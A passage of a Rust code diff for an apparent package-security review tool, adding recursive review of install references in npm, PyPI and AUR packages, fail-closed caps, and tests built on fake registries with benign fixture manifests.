@@ -1,16 +1,14 @@
 use std::io::{IsTerminal, Write};
 
 use crate::baseline::{BaselineSelection, resolve_baseline};
-use crate::cli::{Output, OutputFormat};
+use crate::cli::{Output, OutputFormat, RegistryBases};
 use crate::diff::compute_delta;
 use crate::extract::{ExtractionLimits, safe_extract};
 use crate::heuristic::evaluate_with_trust;
+use crate::install_ref::InstallRef;
 use crate::manifest::{read_aur_srcinfo, read_package_json, read_packed_cargo_toml};
 use crate::policy::Policy;
-use crate::registry::aur::AurRegistry;
-use crate::registry::cratesio::CratesIoRegistry;
-use crate::registry::npm::NpmRegistry;
-use crate::registry::pypi::PyPIRegistry;
+use crate::recursive::ReviewContext;
 use crate::registry::{Checksum, Ecosystem, Registry};
 use crate::render::{render_json, render_text};
 use crate::store::BaselineStore;
@@ -24,73 +22,96 @@ pub struct UnreviewedBaseline {
     pub checksum: Checksum,
 }
 
-fn make_registry(ecosystem: Ecosystem, registry_base: &str) -> anyhow::Result<Box<dyn Registry>> {
-    match ecosystem {
-        Ecosystem::Npm => Ok(Box::new(NpmRegistry::new(registry_base))),
-        Ecosystem::Cargo => Ok(Box::new(CratesIoRegistry::new(registry_base))),
-        Ecosystem::PyPi => Ok(Box::new(PyPIRegistry::new(registry_base))),
-        Ecosystem::Aur => Ok(Box::new(AurRegistry::new(registry_base))),
-    }
+pub(crate) fn ctxless_registry(
+    ecosystem: Ecosystem,
+    bases: &RegistryBases,
+) -> anyhow::Result<std::rc::Rc<dyn Registry>> {
+    Ok(crate::recursive::registry_for(
+        ecosystem,
+        bases.for_ecosystem(ecosystem),
+    ))
 }
 
 /// Evaluates a package specification against its baseline, computing delta,
-/// OSV advisories, and Sigstore provenance to produce a final Verdict and Delta.
+/// OSV advisories, and Sigstore provenance to produce a final Verdict and
+/// Delta, plus the recursive review of any install references the payload
+/// carries.
 pub fn evaluate_package(
     name: &str,
     version_str: &str,
     ecosystem: Ecosystem,
-    registry_base: &str,
     store: &BaselineStore,
     policy: &Policy,
+    ctx: &mut ReviewContext,
 ) -> anyhow::Result<(
     crate::verdict::Verdict,
     crate::diff::Delta,
     crate::registry::Checksum,
     Option<UnreviewedBaseline>,
 )> {
+    ctx.enter_scope(ecosystem, name, version_str, true);
+    let result = evaluate_scoped(name, version_str, ecosystem, store, policy, ctx);
+    ctx.exit_scope();
+    result
+}
+
+pub(crate) fn evaluate_scoped(
+    name: &str,
+    version_str: &str,
+    ecosystem: Ecosystem,
+    store: &BaselineStore,
+    policy: &Policy,
+    ctx: &mut ReviewContext,
+) -> anyhow::Result<(
+    crate::verdict::Verdict,
+    crate::diff::Delta,
+    crate::registry::Checksum,
+    Option<UnreviewedBaseline>,
+)> {
+    let registry = ctx.registry(ecosystem);
     match ecosystem {
-        Ecosystem::Npm => evaluate_with_registry::<NpmRegistry, semver::Version>(
-            NpmRegistry::new(registry_base),
+        Ecosystem::Npm => evaluate_with_registry::<semver::Version>(
+            registry.as_ref(),
             name,
             version_str,
-            registry_base,
             store,
             policy,
+            ctx,
         ),
-        Ecosystem::Cargo => evaluate_with_registry::<CratesIoRegistry, semver::Version>(
-            CratesIoRegistry::new(registry_base),
+        Ecosystem::Cargo => evaluate_with_registry::<semver::Version>(
+            registry.as_ref(),
             name,
             version_str,
-            registry_base,
             store,
             policy,
+            ctx,
         ),
-        Ecosystem::PyPi => evaluate_with_registry::<PyPIRegistry, crate::version::Pep440Version>(
-            PyPIRegistry::new(registry_base),
+        Ecosystem::PyPi => evaluate_with_registry::<crate::version::Pep440Version>(
+            registry.as_ref(),
             name,
             version_str,
-            registry_base,
             store,
             policy,
+            ctx,
         ),
-        Ecosystem::Aur => evaluate_with_registry::<AurRegistry, crate::version::AurVersionInfo>(
-            AurRegistry::new(registry_base),
+        Ecosystem::Aur => evaluate_with_registry::<crate::version::AurVersionInfo>(
+            registry.as_ref(),
             name,
             version_str,
-            registry_base,
             store,
             policy,
+            ctx,
         ),
     }
 }
 
-fn evaluate_with_registry<R: Registry, V: VersionInfo>(
-    registry: R,
+fn evaluate_with_registry<V: VersionInfo>(
+    registry: &dyn Registry,
     name: &str,
     version_str: &str,
-    registry_base: &str,
     store: &BaselineStore,
     policy: &Policy,
+    ctx: &mut ReviewContext,
 ) -> anyhow::Result<(
     crate::verdict::Verdict,
     crate::diff::Delta,
@@ -101,9 +122,10 @@ fn evaluate_with_registry<R: Registry, V: VersionInfo>(
         .map_err(|e| anyhow::anyhow!("invalid version for `{version_str}`: {e}"))?;
 
     let ecosystem = registry.ecosystem();
+    let registry_base = ctx.bases.for_ecosystem(ecosystem).to_string();
     let target_pkg = registry.resolve(name, version_str)?;
 
-    let target_tarball = registry.fetch_tarball(&target_pkg)?;
+    let target_tarball = ctx.fetch_tarball(registry, &target_pkg)?;
 
     let checksum = target_pkg.integrity.clone().ok_or_else(|| {
         anyhow::anyhow!(
@@ -145,11 +167,11 @@ fn evaluate_with_registry<R: Registry, V: VersionInfo>(
     store.record_verified(ecosystem, &target_pkg.name, &target_pkg.version, &checksum)?;
 
     let baseline_res: BaselineSelection =
-        resolve_baseline(&target_pkg.name, &target_ver, &registry, store)
+        resolve_baseline(&target_pkg.name, &target_ver, registry, store)
             .map_err(|e| anyhow::anyhow!("baseline resolution: {e}"))?;
 
     let (delta, base_pkgbuild) = if let Some(base_pkg) = baseline_res.resolution.package() {
-        let base_tarball = registry.fetch_tarball(base_pkg)?;
+        let base_tarball = ctx.fetch_tarball(registry, base_pkg)?;
         let base_temp =
             tempfile::tempdir().map_err(|e| anyhow::anyhow!("creating temp dir: {e}"))?;
         extract_for_ecosystem(
@@ -238,7 +260,7 @@ fn evaluate_with_registry<R: Registry, V: VersionInfo>(
             &target_pkg.version,
             &checksum,
             None,
-            registry_base,
+            &registry_base,
             Some(store),
             policy,
         )),
@@ -254,7 +276,7 @@ fn evaluate_with_registry<R: Registry, V: VersionInfo>(
                 &target_pkg.version,
                 filename,
                 &checksum,
-                registry_base,
+                &registry_base,
                 Some(store),
                 policy,
             ))
@@ -305,7 +327,107 @@ fn evaluate_with_registry<R: Registry, V: VersionInfo>(
         crate::heuristic::apply_extra_findings(&mut verdict, extra, policy);
     }
 
+    // Recall-index staleness (R28): a synced snapshot older than the
+    // policy window is disclosed; an unreadable one is disclosed at
+    // HIGH — a blind revocation index is a coverage hole, never silence.
+    match crate::recall::stale_band(policy) {
+        Ok(Some(band)) => {
+            let finding = crate::verdict::Finding {
+                rule_id: "R28_RECALL_STALE".to_string(),
+                severity: band,
+                title: "Recall index stale".to_string(),
+                description: format!(
+                    "the synced revocation index is older than the policy window                      ({}h); revocation coverage is not current",
+                    policy.recall.max_age_hours
+                ),
+            };
+            crate::heuristic::apply_extra_findings(&mut verdict, vec![finding], policy);
+        }
+        Ok(None) => {}
+        Err(e) => {
+            let finding = crate::verdict::Finding {
+                rule_id: "R28_RECALL_STALE".to_string(),
+                severity: crate::verdict::VerdictBand::High,
+                title: "Recall index unreadable".to_string(),
+                description: format!("the synced revocation index could not be read: {e:#}"),
+            };
+            crate::heuristic::apply_extra_findings(&mut verdict, vec![finding], policy);
+        }
+    }
+
+    // Recursive review pass: every install reference the payload carries
+    // is disclosed (R24), then piped through the same review engine with
+    // depth/cycle/budget caps failing closed (R25/R26), and child findings
+    // at or above the policy band roll up into this verdict (R27).
+    let (mut refs, target_disclosure) =
+        collect_install_refs(ecosystem, &target_root, &target_manifest, &delta);
+    let mut ref_findings = crate::recursive::install_ref_findings(&refs);
+    if let Some(finding) = target_disclosure {
+        ref_findings.push(finding);
+    }
+    if refs.len() > MAX_INSTALL_REFS {
+        let total = refs.len();
+        refs.truncate(MAX_INSTALL_REFS);
+        ref_findings.push(crate::verdict::Finding {
+            rule_id: "R24_LIFECYCLE_INSTALL_REF".to_string(),
+            severity: crate::verdict::VerdictBand::High,
+            title: "Install-reference cap exceeded".to_string(),
+            description: format!(
+                "{total} install references found; only the first {MAX_INSTALL_REFS} are \
+                 reviewed recursively and the rest are NOT reviewed — fail closed"
+            ),
+        });
+    }
+    if !ref_findings.is_empty() {
+        crate::heuristic::apply_extra_findings(&mut verdict, ref_findings, policy);
+    }
+    if !refs.is_empty() {
+        let (children, mut rollup) = ctx.review_children(&refs, store, policy);
+        for child in &children {
+            if child.band >= ctx.child_block_band() {
+                rollup.push(crate::recursive::second_order_finding(child));
+            }
+        }
+        verdict.recursive = children;
+        if !rollup.is_empty() {
+            crate::heuristic::apply_extra_findings(&mut verdict, rollup, policy);
+        }
+    }
+
     Ok((verdict, delta, checksum, unreviewed_baseline))
+}
+
+/// Cap on install references reviewed recursively per package: a hostile
+/// payload naming thousands of references must not multiply the review
+/// fan-out. The overflow is disclosed fail closed at the call site.
+const MAX_INSTALL_REFS: usize = 32;
+
+/// Install references in the reviewed payload, per ecosystem: npm manifest
+/// lifecycle scripts, AUR PKGBUILD npm/bun delivery, PyPI wheel
+/// `.data/scripts`. Cargo `build.rs` can shell out but has no structured
+/// install-reference grammar to extract statically in v1 — the cargo lane
+/// is disclosed by the existing build-code findings.
+fn collect_install_refs(
+    ecosystem: Ecosystem,
+    target_root: &std::path::Path,
+    target_manifest: &crate::manifest::PackageJson,
+    delta: &crate::diff::Delta,
+) -> (Vec<InstallRef>, Option<crate::verdict::Finding>) {
+    match ecosystem {
+        Ecosystem::Npm => (
+            crate::install_ref::from_npm_lifecycle(target_manifest),
+            None,
+        ),
+        Ecosystem::PyPi => (
+            crate::install_ref::from_wheel_data_scripts(target_root, delta),
+            None,
+        ),
+        Ecosystem::Aur => match std::fs::read_to_string(target_root.join("PKGBUILD")) {
+            Ok(text) => (crate::pkgbuild::npm_delivery_refs(&text), None),
+            Err(e) => (Vec::new(), Some(target_unreadable_finding(&e.to_string()))),
+        },
+        Ecosystem::Cargo => (Vec::new(), None),
+    }
 }
 
 fn extract_for_ecosystem(
@@ -402,6 +524,20 @@ fn baseline_unreadable_finding() -> crate::verdict::Finding {
     }
 }
 
+// The target PKGBUILD itself cannot be read (permissions, non-UTF-8):
+// delivery references are unextractable, so the hole is disclosed at the
+// same HIGH band rather than scanned as an empty file.
+fn target_unreadable_finding(detail: &str) -> crate::verdict::Finding {
+    crate::verdict::Finding {
+        rule_id: "R00_BASELINE_UNREADABLE".to_string(),
+        severity: crate::verdict::VerdictBand::High,
+        title: "Target PKGBUILD unreadable".to_string(),
+        description: format!(
+            "target PKGBUILD could not be read ({detail}); delivery references unextractable"
+        ),
+    }
+}
+
 fn bootstrap_hint(verdict: &crate::verdict::Verdict) -> Option<String> {
     let name = &crate::render::sanitize_single_line(&verdict.name);
     if verdict
@@ -439,24 +575,19 @@ fn bootstrap_hint(verdict: &crate::verdict::Verdict) -> Option<String> {
 pub fn run(
     pkg_spec: &str,
     ecosystem: Ecosystem,
-    registry_base: &str,
+    bases: &RegistryBases,
     output: Output,
     policy_path: Option<&std::path::Path>,
     yes: bool,
 ) -> anyhow::Result<()> {
     let policy = Policy::load_or_default(policy_path)?;
-    let registry = make_registry(ecosystem, registry_base)?;
+    let registry = ctxless_registry(ecosystem, bases)?;
     let (name, version_str) = parse_spec_flexible(pkg_spec, registry.as_ref())?;
     let store = BaselineStore::open()?;
 
-    let (verdict, delta, checksum, unreviewed_baseline) = evaluate_package(
-        &name,
-        &version_str,
-        ecosystem,
-        registry_base,
-        &store,
-        &policy,
-    )?;
+    let mut ctx = ReviewContext::new(&policy, bases.clone());
+    let (verdict, delta, checksum, unreviewed_baseline) =
+        evaluate_package(&name, &version_str, ecosystem, &store, &policy, &mut ctx)?;
 
     let format = output.resolve(std::io::stdout().is_terminal());
     match format {
@@ -533,7 +664,7 @@ pub fn run(
 pub fn install(
     pkg_spec: &str,
     ecosystem: Ecosystem,
-    registry_base: &str,
+    bases: &RegistryBases,
     npm_args: &[String],
     policy_path: Option<&std::path::Path>,
     yes: bool,
@@ -565,18 +696,13 @@ pub fn install(
 
     crate::executor::validate_extra_args(npm_args)?;
     let policy = Policy::load_or_default(policy_path)?;
-    let registry = make_registry(ecosystem, registry_base)?;
+    let registry = ctxless_registry(ecosystem, bases)?;
     let (name, version_str) = parse_spec_flexible(pkg_spec, registry.as_ref())?;
     let store = BaselineStore::open()?;
 
-    let (verdict, delta, checksum, unreviewed_baseline) = evaluate_package(
-        &name,
-        &version_str,
-        ecosystem,
-        registry_base,
-        &store,
-        &policy,
-    )?;
+    let mut ctx = ReviewContext::new(&policy, bases.clone());
+    let (verdict, delta, checksum, unreviewed_baseline) =
+        evaluate_package(&name, &version_str, ecosystem, &store, &policy, &mut ctx)?;
     render_text(&verdict, &delta);
 
     let is_interactive = std::io::stdin().is_terminal() && std::io::stdout().is_terminal();
@@ -634,7 +760,11 @@ pub fn install(
 
     if approved {
         let install_spec = format!("{name}@{version_str}");
-        crate::executor::install_with_ignore_scripts(&install_spec, registry_base, npm_args)?;
+        crate::executor::install_with_ignore_scripts(
+            &install_spec,
+            bases.for_ecosystem(Ecosystem::Npm),
+            npm_args,
+        )?;
         Ok(())
     } else {
         eprintln!("Held {}@{}; installation blocked.", name, version_str);
@@ -839,7 +969,10 @@ pub fn parse_spec(spec: &str, ecosystem: Ecosystem) -> anyhow::Result<(String, S
 /// Flexible parser for install: `<name>` or `<name>@<version>`.
 /// If version is omitted, resolves the registry's default version
 /// (`dist-tags.latest` for npm, falling back to latest stable semver release).
-fn parse_spec_flexible(spec: &str, registry: &dyn Registry) -> anyhow::Result<(String, String)> {
+pub(crate) fn parse_spec_flexible(
+    spec: &str,
+    registry: &dyn Registry,
+) -> anyhow::Result<(String, String)> {
     let has_version_sep = spec.contains("==")
         || if let Some(rest) = spec.strip_prefix('@') {
             rest.contains('@')
@@ -882,6 +1015,31 @@ mod tests {
         let f = baseline_unreadable_finding();
         assert_eq!(f.rule_id, "R00_BASELINE_UNREADABLE");
         assert_eq!(f.severity, crate::verdict::VerdictBand::High);
+    }
+
+    #[test]
+    fn target_unreadable_pkgbuild_is_disclosed_high() {
+        let f = target_unreadable_finding("permission denied");
+        assert_eq!(f.rule_id, "R00_BASELINE_UNREADABLE");
+        assert_eq!(f.severity, crate::verdict::VerdictBand::High);
+        assert!(f.description.contains("permission denied"));
+
+        let dir = tempfile::tempdir().unwrap();
+        let delta = crate::diff::Delta {
+            baseline_version: None,
+            target_version: "1.0-1".into(),
+            ..Default::default()
+        };
+        let manifest = crate::manifest::PackageJson {
+            name: "demo".into(),
+            version: "1.0-1".into(),
+            ..Default::default()
+        };
+        let (refs, disclosure) =
+            collect_install_refs(Ecosystem::Aur, dir.path(), &manifest, &delta);
+        assert!(refs.is_empty());
+        let finding = disclosure.expect("missing PKGBUILD must disclose, never silent allow");
+        assert_eq!(finding.severity, crate::verdict::VerdictBand::High);
     }
 
     #[test]
@@ -1180,6 +1338,780 @@ mod tests {
                 "AUR archive declares pkgbase `other` but the review resolved `demo`; refusing to review"
             ),
             "unexpected error: {err}"
+        );
+    }
+}
+
+#[cfg(test)]
+mod recursive_tests {
+    use super::*;
+    use crate::registry::{Checksum, ChecksumAlg, Package, Release};
+    use crate::store::BaselineStore;
+    use std::collections::HashMap;
+
+    struct FakeRegistry {
+        packages: HashMap<String, String>,
+        fetches: std::sync::Arc<std::sync::atomic::AtomicU32>,
+    }
+
+    impl FakeRegistry {
+        fn new(packages: &[(&str, &str)]) -> Self {
+            Self::with_counter(
+                packages,
+                std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0)),
+            )
+        }
+
+        fn with_counter(
+            packages: &[(&str, &str)],
+            fetches: std::sync::Arc<std::sync::atomic::AtomicU32>,
+        ) -> Self {
+            Self {
+                packages: packages
+                    .iter()
+                    .map(|(k, v)| (k.to_string(), v.to_string()))
+                    .collect(),
+                fetches,
+            }
+        }
+
+        fn tarball_bytes(&self, name: &str, version: &str) -> Option<Vec<u8>> {
+            let json = self.packages.get(&format!("{name}@{version}"))?;
+            Some(build_npm_tarball(json))
+        }
+    }
+
+    impl Registry for FakeRegistry {
+        fn ecosystem(&self) -> Ecosystem {
+            Ecosystem::Npm
+        }
+        fn resolve(
+            &self,
+            name: &str,
+            version: &str,
+        ) -> Result<Package, crate::error::BluelineError> {
+            let bytes = self
+                .tarball_bytes(name, version)
+                .ok_or_else(|| crate::error::BluelineError::NotFound(name.to_string()))?;
+            Ok(Package {
+                name: name.to_string(),
+                version: version.to_string(),
+                tarball_url: "https://fixture.invalid/x.tgz".to_string(),
+                integrity: Some(sha512_checksum(&bytes)),
+            })
+        }
+        fn fetch_tarball(&self, pkg: &Package) -> Result<Vec<u8>, crate::error::BluelineError> {
+            use std::sync::atomic::Ordering;
+            self.fetches.fetch_add(1, Ordering::SeqCst);
+            self.tarball_bytes(&pkg.name, &pkg.version)
+                .ok_or_else(|| crate::error::BluelineError::NotFound(pkg.name.clone()))
+        }
+        fn list_versions(
+            &self,
+            name: &str,
+        ) -> Result<Vec<semver::Version>, crate::error::BluelineError> {
+            let mut versions: Vec<semver::Version> = self
+                .packages
+                .keys()
+                .filter(|k| k.rsplit_once('@').map(|(n, _)| n == name).unwrap_or(false))
+                .filter_map(|k| k.rsplit_once('@')?.1.parse().ok())
+                .collect();
+            versions.sort();
+            Ok(versions)
+        }
+        fn list_releases(&self, name: &str) -> Result<Vec<Release>, crate::error::BluelineError> {
+            Ok(self
+                .list_versions(name)?
+                .into_iter()
+                .map(|v| Release {
+                    version: v.to_string(),
+                    yanked: false,
+                    publish_time: None,
+                })
+                .collect())
+        }
+        fn default_version(
+            &self,
+            name: &str,
+        ) -> Result<Option<String>, crate::error::BluelineError> {
+            Ok(self
+                .list_versions(name)?
+                .iter()
+                .map(|v| v.to_string())
+                .next_back())
+        }
+    }
+
+    struct FakePyPI {
+        packages: Vec<String>,
+    }
+
+    impl FakePyPI {
+        fn new(pinned_specs: &[&str]) -> Self {
+            Self {
+                packages: pinned_specs.iter().map(|s| s.to_string()).collect(),
+            }
+        }
+
+        fn tarball_bytes(&self, name: &str, version: &str) -> Option<Vec<u8>> {
+            if !self
+                .packages
+                .iter()
+                .any(|s| s == &format!("{name}=={version}"))
+            {
+                return None;
+            }
+            let metadata = format!("Name: {name}\nVersion: {version}\n");
+            Some(build_sdist_tarball(&metadata))
+        }
+    }
+
+    impl Registry for FakePyPI {
+        fn ecosystem(&self) -> Ecosystem {
+            Ecosystem::PyPi
+        }
+        fn resolve(
+            &self,
+            name: &str,
+            version: &str,
+        ) -> Result<Package, crate::error::BluelineError> {
+            let bytes = self
+                .tarball_bytes(name, version)
+                .ok_or_else(|| crate::error::BluelineError::NotFound(name.to_string()))?;
+            Ok(Package {
+                name: name.to_string(),
+                version: version.to_string(),
+                tarball_url: format!("https://fixture.invalid/{name}-{version}.tar.gz"),
+                integrity: Some(sha512_checksum(&bytes)),
+            })
+        }
+        fn fetch_tarball(&self, pkg: &Package) -> Result<Vec<u8>, crate::error::BluelineError> {
+            self.tarball_bytes(&pkg.name, &pkg.version)
+                .ok_or_else(|| crate::error::BluelineError::NotFound(pkg.name.clone()))
+        }
+        fn list_versions(
+            &self,
+            _name: &str,
+        ) -> Result<Vec<semver::Version>, crate::error::BluelineError> {
+            Ok(Vec::new())
+        }
+        fn list_releases(&self, _name: &str) -> Result<Vec<Release>, crate::error::BluelineError> {
+            Ok(Vec::new())
+        }
+        fn default_version(
+            &self,
+            _name: &str,
+        ) -> Result<Option<String>, crate::error::BluelineError> {
+            Ok(None)
+        }
+    }
+
+    fn build_sdist_tarball(metadata: &str) -> Vec<u8> {
+        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        {
+            let mut tar = tar::Builder::new(&mut enc);
+            let mut header = tar::Header::new_gnu();
+            header.set_path("pkg-1.0.0/METADATA").unwrap();
+            header.set_size(metadata.len() as u64);
+            header.set_mode(0o644);
+            header.set_cksum();
+            tar.append(&header, metadata.as_bytes()).unwrap();
+            tar.finish().unwrap();
+        }
+        enc.finish().unwrap()
+    }
+
+    fn build_npm_tarball(package_json: &str) -> Vec<u8> {
+        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        {
+            let mut tar = tar::Builder::new(&mut enc);
+            let mut header = tar::Header::new_gnu();
+            let path = "package/package.json";
+            header.set_path(path).unwrap();
+            header.set_size(package_json.len() as u64);
+            header.set_mode(0o644);
+            header.set_cksum();
+            tar.append(&header, package_json.as_bytes()).unwrap();
+            tar.finish().unwrap();
+        }
+        enc.finish().unwrap()
+    }
+
+    fn sha512_checksum(bytes: &[u8]) -> Checksum {
+        use sha2::{Digest, Sha512};
+        Checksum {
+            alg: ChecksumAlg::Sha512,
+            value_hex: hex_encode(&Sha512::digest(bytes)),
+        }
+    }
+
+    fn hex_encode(bytes: &[u8]) -> String {
+        bytes.iter().map(|b| format!("{b:02x}")).collect()
+    }
+
+    fn fixture_bases() -> RegistryBases {
+        RegistryBases {
+            npm: "http://127.0.0.1:9".to_string(),
+            cargo: "http://127.0.0.1:9".to_string(),
+            pypi: "http://127.0.0.1:9".to_string(),
+            aur: "http://127.0.0.1:9".to_string(),
+        }
+    }
+
+    fn no_advisory_policy() -> Policy {
+        let mut policy = Policy::default();
+        policy.policy.check_advisories = false;
+        policy
+    }
+
+    fn evaluate_test(
+        packages: &[(&str, &str)],
+        spec: &str,
+        policy: &Policy,
+    ) -> (crate::verdict::Verdict, u32) {
+        let (name, version) = spec.split_once('@').unwrap();
+        let store_dir = tempfile::tempdir().unwrap();
+        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
+        let mut ctx = ReviewContext::new(policy, fixture_bases());
+        let registry = std::rc::Rc::new(FakeRegistry::new(packages));
+        ctx.inject_registry(Ecosystem::Npm, registry.clone());
+        let (verdict, _, _, _) =
+            evaluate_package(name, version, Ecosystem::Npm, &store, policy, &mut ctx).unwrap();
+        use std::sync::atomic::Ordering;
+        (verdict, registry.fetches.load(Ordering::SeqCst))
+    }
+
+    #[test]
+    fn lifecycle_reference_triggers_recursive_review() {
+        let policy = no_advisory_policy();
+        let (verdict, _) = evaluate_test(
+            &[
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
+                ),
+                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
+            ],
+            "a@1.0.0",
+            &policy,
+        );
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
+                    && f.severity == crate::verdict::VerdictBand::High),
+            "expected R24 High, got {:?}",
+            verdict
+                .findings
+                .iter()
+                .map(|f| &f.rule_id)
+                .collect::<Vec<_>>()
+        );
+        assert_eq!(verdict.recursive.len(), 1);
+        let child = &verdict.recursive[0];
+        assert_eq!(child.name, "b");
+        assert_eq!(child.version, "1.0.0");
+        assert_eq!(child.chain, vec!["a@1.0.0", "npm:b@1.0.0"]);
+        // A Medium child stays below the default HIGH roll-up threshold.
+        assert!(
+            !verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R27_SECOND_ORDER"),
+            "Medium child must not roll up at the HIGH threshold"
+        );
+    }
+
+    #[test]
+    fn child_block_band_policy_lowering_rolls_up_medium_children() {
+        let mut policy = no_advisory_policy();
+        policy.recursion.child_block_band = crate::verdict::VerdictBand::Medium;
+        let (verdict, _) = evaluate_test(
+            &[
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
+                ),
+                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
+            ],
+            "a@1.0.0",
+            &policy,
+        );
+        let r27 = verdict
+            .findings
+            .iter()
+            .find(|f| f.rule_id == "R27_SECOND_ORDER")
+            .expect("MEDIUM threshold rolls up the Medium child");
+        assert_eq!(r27.severity, crate::verdict::VerdictBand::Medium);
+    }
+
+    #[test]
+    fn repeated_reference_reuses_cached_review_after_budget_spent() {
+        let mut policy = no_advisory_policy();
+        policy.recursion.max_child_reviews = 1;
+        let (verdict, _) = evaluate_test(
+            &[
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0","prepare":"npm install b@1.0.0"}}"#,
+                ),
+                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
+            ],
+            "a@1.0.0",
+            &policy,
+        );
+        assert_eq!(
+            verdict.recursive.len(),
+            2,
+            "a cached reuse must survive budget exhaustion"
+        );
+        assert!(
+            !verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R25_RECURSION_DEPTH"),
+            "reusing a completed review is not a cap violation"
+        );
+    }
+
+    #[test]
+    fn unpinned_reference_does_not_reuse_a_stale_pinned_review() {
+        // `foo@1.0.0` is reviewed first; the bare `foo` floats and must
+        // resolve the current latest (`2.0.0`) for its own review rather
+        // than reusing the completed `1.0.0` review. Reusing it would vouch
+        // for bytes the install never fetches.
+        let policy = no_advisory_policy();
+        let (verdict, _) = evaluate_test(
+            &[
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install foo@1.0.0 && npm install foo"}}"#,
+                ),
+                ("foo@1.0.0", r#"{"name":"foo","version":"1.0.0"}"#),
+                ("foo@2.0.0", r#"{"name":"foo","version":"2.0.0"}"#),
+            ],
+            "a@1.0.0",
+            &policy,
+        );
+        assert_eq!(
+            verdict.recursive.len(),
+            2,
+            "pinned and floating references must each be reviewed: {}",
+            serde_json::to_string(&verdict.recursive).unwrap_or_default()
+        );
+        let mut versions: Vec<&str> = verdict
+            .recursive
+            .iter()
+            .map(|c| c.version.as_str())
+            .collect();
+        versions.sort_unstable();
+        assert_eq!(versions, ["1.0.0", "2.0.0"]);
+    }
+
+    #[test]
+    fn unpinned_reference_reuses_the_exact_completed_review() {
+        // When the floating reference resolves to the already-reviewed
+        // release, the exact completed review is reused: one fresh review,
+        // two roll-ups, no cap violation.
+        let policy = no_advisory_policy();
+        let (verdict, _) = evaluate_test(
+            &[
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install foo@1.0.0 && npm install foo"}}"#,
+                ),
+                ("foo@1.0.0", r#"{"name":"foo","version":"1.0.0"}"#),
+            ],
+            "a@1.0.0",
+            &policy,
+        );
+        assert_eq!(verdict.recursive.len(), 2);
+        assert!(
+            verdict.recursive.iter().all(|c| c.version == "1.0.0"),
+            "both references resolve the same release: {:?}",
+            verdict
+                .recursive
+                .iter()
+                .map(|c| &c.version)
+                .collect::<Vec<_>>()
+        );
+        assert!(
+            !verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R25_RECURSION_DEPTH"),
+            "reusing the exact completed review is not a cap violation"
+        );
+    }
+
+    #[test]
+    fn recursive_pass_runs_on_modified_lifecycle_script_with_baseline() {
+        let policy = no_advisory_policy();
+        let store_dir = tempfile::tempdir().unwrap();
+        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
+        let old_json = r#"{"name":"a","version":"0.9.0"}"#;
+        let old_tar = build_npm_tarball(old_json);
+        store
+            .record_verified(Ecosystem::Npm, "a", "0.9.0", &sha512_checksum(&old_tar))
+            .unwrap();
+        store
+            .mark_clean(Ecosystem::Npm, "a", "0.9.0", &sha512_checksum(&old_tar))
+            .unwrap();
+        let mut ctx = ReviewContext::new(&policy, fixture_bases());
+        ctx.inject_registry(
+            Ecosystem::Npm,
+            std::rc::Rc::new(FakeRegistry::new(&[
+                ("a@0.9.0", old_json),
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
+                ),
+                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
+            ])),
+        );
+        let (verdict, _, _, _) =
+            evaluate_package("a", "1.0.0", Ecosystem::Npm, &store, &policy, &mut ctx).unwrap();
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"),
+            "R24 must fire on a baseline review too: {:?}",
+            verdict
+                .findings
+                .iter()
+                .map(|f| &f.rule_id)
+                .collect::<Vec<_>>()
+        );
+        assert_eq!(verdict.recursive.len(), 1);
+    }
+
+    #[test]
+    fn install_references_at_the_exact_cap_are_not_disclosed_as_overflow() {
+        let policy = no_advisory_policy();
+        let specs: Vec<(String, String)> = (1..=MAX_INSTALL_REFS as i64)
+            .map(|i| {
+                let json = format!(r#"{{"name":"p{i}","version":"1.0.0"}}"#);
+                (format!("p{i}@1.0.0"), json)
+            })
+            .collect();
+        let many = specs
+            .iter()
+            .map(|(k, _)| k.as_str())
+            .collect::<Vec<_>>()
+            .join(" ");
+        let script =
+            r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install SPECS"}}"#
+                .replace("SPECS", &many);
+        let mut packages: Vec<(&str, &str)> = vec![("a@1.0.0", script.as_str())];
+        packages.extend(specs.iter().map(|(k, v)| (k.as_str(), v.as_str())));
+        let (verdict, _) = evaluate_test(&packages, "a@1.0.0", &policy);
+        assert!(
+            !verdict
+                .findings
+                .iter()
+                .any(|f| f.title == "Install-reference cap exceeded"),
+            "exactly {MAX_INSTALL_REFS} references fit the cap; disclosure would be a false positive"
+        );
+    }
+
+    #[test]
+    fn install_reference_overflow_is_truncated_and_disclosed() {
+        let policy = no_advisory_policy();
+        let specs: Vec<(String, String)> = (1..=33)
+            .map(|i| {
+                let json = format!(r#"{{"name":"p{i}","version":"1.0.0"}}"#);
+                (format!("p{i}@1.0.0"), json)
+            })
+            .collect();
+        let many = specs
+            .iter()
+            .map(|(k, _)| k.as_str())
+            .collect::<Vec<_>>()
+            .join(" ");
+        let script =
